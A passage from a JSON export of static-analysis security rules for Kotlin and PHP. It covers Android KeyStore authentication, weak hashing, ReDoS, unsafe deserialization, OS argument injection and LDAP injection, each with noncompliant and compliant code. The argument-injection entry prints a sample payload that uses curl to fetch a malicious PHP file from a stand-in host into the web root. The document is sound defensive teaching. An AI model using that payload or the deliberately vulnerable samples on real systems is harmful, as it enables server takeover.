href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S6288": {
        "name": "Authorizing non-authenticated users to use keys in the Android KeyStore is security-sensitive",
        "htmlDesc": "<p>Android KeyStore is a secure container for storing key materials, in particular it prevents key materials extraction, i.e. when the application\nprocess is compromised, the attacker cannot extract keys but may still be able to use them. It’s possible to enable an Android security feature, user\nauthentication, to restrict usage of keys to only authenticated users. The lock screen has to be unlocked with defined credentials\n(pattern/PIN/password, biometric).</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application requires prohibiting the use of keys in case of compromise of the application process. </li>\n  <li> The key material is used in the context of a highly sensitive application like a e-banking mobile app. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable user authentication (by setting <code>setUserAuthenticationRequired</code> to <code>true</code> during key generation)\nto use keys for a limited duration of time (by setting appropriate values to <code>setUserAuthenticationValidityDurationSeconds</code>), after which\nthe user must re-authenticate.</p>\n<h2>Sensitive Code Example</h2>\n<p>Any users can use the key:</p>\n<pre>\nval keyGenerator: KeyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\")\n\nvar builder: KeyGenParameterSpec = KeyGenParameterSpec.Builder(\"test_secret_key\", KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT) // Noncompliant\n   .setBlockModes(KeyProperties.BLOCK_MODE_GCM)\n   .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)\n   .build()\n\nkeyGenerator.init(builder)\n</pre>\n<h2>Compliant Solution</h2>\n<p>The use of the key is limited to authenticated users (for a duration of time defined to 60 seconds):</p>\n<pre>\nval keyGenerator: KeyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\")\n\nvar builder: KeyGenParameterSpec = KeyGenParameterSpec.Builder(\"test_secret_key\", KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)\n   .setBlockModes(KeyProperties.BLOCK_MODE_GCM)\n   .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)\n   .setUserAuthenticationRequired(true) // Compliant\n   .setUserAuthenticationParameters (60, KeyProperties.AUTH_DEVICE_CREDENTIAL)\n   .build()\n\nkeyGenerator.init(builder)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/keystore\">developer.android.com</a> - Android keystore system </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/keystore#UserAuthentication\">developer.android.com</a> - Require user\n  authentication for key use </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard</a> - Authentication and Session Management Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication\">OWASP Mobile Top 10 2016 Category M4</a> - Insecure\n  Authentication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/522\">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kotlin:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,\nit takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash\nvalue gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,\nMD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>\n<p>The following APIs are tracked for use of obsolete crypto algorithms:</p>\n<ul>\n  <li> <code>java.security.AlgorithmParameters</code> (JDK) </li>\n  <li> <code>java.security.AlgorithmParameterGenerator</code> (JDK) </li>\n  <li> <code>java.security.MessageDigest</code> (JDK) </li>\n  <li> <code>java.security.KeyFactory</code> (JDK) </li>\n  <li> <code>java.security.KeyPairGenerator</code> (JDK) </li>\n  <li> <code>java.security.Signature</code> (JDK) </li>\n  <li> <code>javax.crypto.Mac</code> (JDK) </li>\n  <li> <code>javax.crypto.KeyGenerator</code> (JDK) </li>\n  <li> <code>org.apache.commons.codec.digest.DigestUtils</code> (Apache Commons Codec) </li>\n  <li> <code>org.springframework.util.DigestUtils</code> </li>\n  <li> <code>com.google.common.hash.Hashing</code> (Guava) </li>\n  <li> <code>org.springframework.security.authentication.encoding.ShaPasswordEncoder</code> (Spring Security 4.2.x) </li>\n  <li> <code>org.springframework.security.authentication.encoding.Md5PasswordEncoder</code> (Spring Security 4.2.x) </li>\n  <li> <code>org.springframework.security.crypto.password.LdapShaPasswordEncoder</code> (Spring Security 5.0.x) </li>\n  <li> <code>org.springframework.security.crypto.password.Md4PasswordEncoder</code> (Spring Security 5.0.x) </li>\n  <li> <code>org.springframework.security.crypto.password.MessageDigestPasswordEncoder</code> (Spring Security 5.0.x) </li>\n  <li> <code>org.springframework.security.crypto.password.NoOpPasswordEncoder</code> (Spring Security 5.0.x) </li>\n  <li> <code>org.springframework.security.crypto.password.StandardPasswordEncoder</code> (Spring Security 5.0.x) </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nval md1: MessageDigest = MessageDigest.getInstance(\"SHA\");  // Sensitive:  SHA is not a standard name, for most security providers it's an alias of SHA-1\nval md2: MessageDigest = MessageDigest.getInstance(\"SHA1\");  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nval md1: MessageDigest = MessageDigest.getInstance(\"SHA-512\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/1240\">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "phpsecurity:S2631": {
        "name": "Regular expressions should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>\n<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this\ncan lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to make the affected component inaccessible.</p>\n<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Self Denial of Service</h4>\n<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)\ncan trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>\n<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>\n<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service might only affect the attacker who initiated it.</p>\n<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems\nwould detect the failure of a container and automatically replace it.</p>\n<h4>Infrastructure SPOFs</h4>\n<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture\nvulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient\ncontainer creation capabilities or failures from containers to terminate).</p>\n<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge\noffensive infrastructures.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without\nprior sanitization or validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfunction lookup(string $data): bool {\n  $regex = $_GET[\"regex\"];\n  return preg_match($regex, $data); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfunction lookup(string $data): bool {\n  $regex = $_GET[\"regex\"];\n  return preg_match(preg_quote($regex), $data);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Sanitization and Validation</h4>\n<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular\nexpression engine interprets these characters literally.</p>\n<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>\nIf a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>\n<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>\n<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href=\"https://github.com/google/re2\">re2</a>.</p>\n<p>In the compliant solution, <code>preg_quote</code> escapes metacharacters and escape sequences that could have broken the initially intended\nlogic.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">OWASP Regular expression Denial of Service - ReDoS</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "phpsecurity:S5135": {
        "name": "Deserialization should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application performing unsafe deserialization:<br> After detecting the injection vector, attackers inject a\ncarefully-crafted payload into the application.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s\nbehavior.</p>\n<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges\nor perform unwanted actions.<br> In the context of an e-commerce application, this could be changing the number of products or prices.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code\nexecution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to\nelevate his privileges as an administrator and attack other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nthrough a combination of unsafe deserialization and misconfiguration:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$cookie = $_COOKIE['session'];\n$session = unserialize($session); // Noncompliant\n\necho $session-&gt;auth ? \"OK\" : \"KO\";\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$cookie = $_COOKIE['session'];\nlist($session, $mac) = explode('|', $cookie, 2);\n$hash = hash_hmac(\"sha256\", $session, $KEY);\n\nif (hash_equals($hash, $mac)) {\n    $session = unserialize($session);\n} else {\n    die;\n}\n\necho $session-&gt;auth ? \"OK\" : \"KO\";\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>\n<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br> Therefore, our first suggestion is to\navoid deserialization in the first place.</p>\n<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>\n<h4>More secure serialization methods</h4>\n<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>\n<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br>\nIn this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>\n<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br> The most\ncommon method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the\nProtobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>\n<h4>Integrity check</h4>\n<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application\nserver:</p>\n<ul>\n  <li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li>\n  <li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li>\n</ul>\n<p>Depending on the situation, two MAC computation modes can be used.</p>\n<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC\nshould be preferred, with a strong underlying hash algorithm such as SHA-256.</p>\n<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a\nsigning secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>\n<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>\n<p>Here, the compliant code example uses the <code>hash_hmac</code> function to compute the integrity tag of the untrusted data. The underlying hash\nalgorithm is set to <code>sha256</code>, which is considered strong for this use case.</p>\n<h4>Pre-Approved classes</h4>\n<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br> If the untrusted class does\nnot match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br> Depending on the language\nor framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>\n<h3>Pitfalls</h3>\n<h4>Non-constant time authenticity checks</h4>\n<p>When using a MAC to validate the authenticity of an untrusted serialized string, it is important to rely on constant time implementations. Indeed,\nin most cases, classical string equality check operators work lazily. As soon as a difference is found between two strings, they consider them\ndifferent and return. Their response time will therefore vary depending on where the first difference has been found.</p>\n<p>In security-sensitive contexts, this difference in execution time leaks information about the secret value being compared. It allows for timing\nattacks that could void the authenticity check.</p>\n<p>The compliant code example uses the <code>hash_equals</code> function to compare authentication tags. This one benefits from constant-time\nimplementation.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S5883": {
        "name": "OS commands should not be vulnerable to argument injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data\nis limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the\nbehavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The\nsecurity of the application depends on the behavior of the application that is executed.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the\ncommand the parameters are added to, this might lead to arbitrary command execution.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>\n<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or\nsanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected\nsystem command behavior.</p>\n<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the\nfollowing payload will download malicious software on the application’s hosting server.</p>\n<pre>\n -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;\n</pre>\n<p>Other standard PHP functions are susceptible to the same vulnerable behavior. Especially, the <code>mail</code> function accepts, as its fifth\nargument, parameters that will be appended to the configured mail-sending program command line. This might lead to a similar exploitation\nscenario.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$arg=$_GET['file'];\necho \"&lt;h1&gt;File search results:&lt;/h1&gt;&lt;br/&gt;\";\n$cmd=escapeshellcmd('find /tmp/images -iname ' . $arg);\npassthru($cmd);\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n$arg=$_GET['arg'];\necho \"&lt;h1&gt;Sending test mail.&lt;/h1&gt;&lt;br/&gt;\";\nmail(\"mail@example.org\", \"example subject\", \"Example\", [], $arg);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$arg=$_GET['file'];\necho \"&lt;h1&gt;File search results:&lt;/h1&gt;&lt;br/&gt;\";\n$cmd='find /tmp/images -iname ' . escapeshellarg($arg);\npassthru($cmd);\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n$arg=$_GET['arg'];\necho \"&lt;h1&gt;Sending test mail.&lt;/h1&gt;&lt;br/&gt;\";\n\n$allowed_args_mapping = [\"-n\",\"-v\"];\nif (! in_array($arg, $allowed_args_mapping, true)) {\n\t$arg = \"\";\n}\nmail(\"mail@example.org\", \"example subject\", \"Example\", [], $arg);\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid\nusing OS commands in the first place.</p>\n<p>When building a system command from user-submitted data is unavoidable, using the <code>escapeshellarg</code> sanitizing function should be\npreferred. It ensures that the provided data will be considered a single argument and prevents the injection of subsequent ones.</p>\n<p>It is also important not to combine both <code>escapeshellarg</code> and <code>escapeshellcmd</code>. Indeed, a call to <code>escapeshellcmd</code>\non a complete command line will void any escaping previously added with <code>escapeshellarg</code>.</p>\n<p>Therefore, it is impossible to prevent an argument injection issue in the <code>mail</code> function with <code>escapeshellarg</code>. Indeed,\n<code>mail</code> internally relies on <code>escapeshellcmd</code> for escaping purposes. In that case, an allowlist of explicitly trusted additional\narguments should be used.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheat Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/roundcube-command-execution-via-email/\">Roundcube 1.2.2: Command Execution via Email</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "phpsecurity:S2078": {
        "name": "LDAP queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it\nfirst.</p>\n<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must\nbe treated the same way as basic LDAP injections.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable\nfield to execute malicious LDAP commands.</p>\n<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data leakage or corruption</h4>\n<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data\nleakage or corruption.</p>\n<h4>Privilege escalation</h4>\n<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform\nauthorization checks or authentication.</p>\n<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to LDAP injection because untrusted data is concatenated to an LDAP query without prior sanitization\nor validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$ldapconn = ldap_connect(\"localhost\");\n\nif($ldapconn){\n  $user = $_GET[\"user\"];\n\n  $filter = \"(&amp;(objectClass=user)(uid=\" . $user . \"))\";\n  $dn = \"dc=example,dc=org\";\n\n  ldap_list($ldapconn, $dn, $filter); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$ldapconn = ldap_connect(\"localhost\");\n\nif($ldapconn){\n  $user = $ldap_escape($_GET[\"user\"], \"\", LDAP_ESCAPE_FILTER);\n\n  $filter = \"(&amp;(objectClass=user)(uid=\" . $user . \"))\";\n  $dn = \"dc=example,dc=org\";\n\n  ldap_list($ldapconn, $dn, $filter);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>\n<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>\n<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the\napplication to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>\n<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>\n<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>\n<ul>\n  <li> <code>\\</code> </li>\n  <li> <code>#</code> </li>\n  <li> <code>+</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>,</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>\"</code> </li>\n  <li> <code>=</code> </li>\n</ul>\n<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>\n<ul>\n  <li> <code>*</code> </li>\n  <li> <code>(</code> </li>\n  <li> <code>)</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>null</code> </li>\n</ul>\n<p>For PHP, the core library function <a href=\"https://www.php.net/manual/en/function.ldap-escape.php\"><code>ldap_escape</code></a> allows sanitizing\nthese characters.</p>\n<p>In the compliant solution example, the <code>ldap_escape</code> function is used with the <code>LDAP_ESCAPE_FILTER</code> flag, which sanitizes\npotentially malicious characters in the search filter. The function can also be used with the <code>LDAP_ESCAPE_DN</code> flag, which sanitizes the\ndistinguished name (DN).</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - 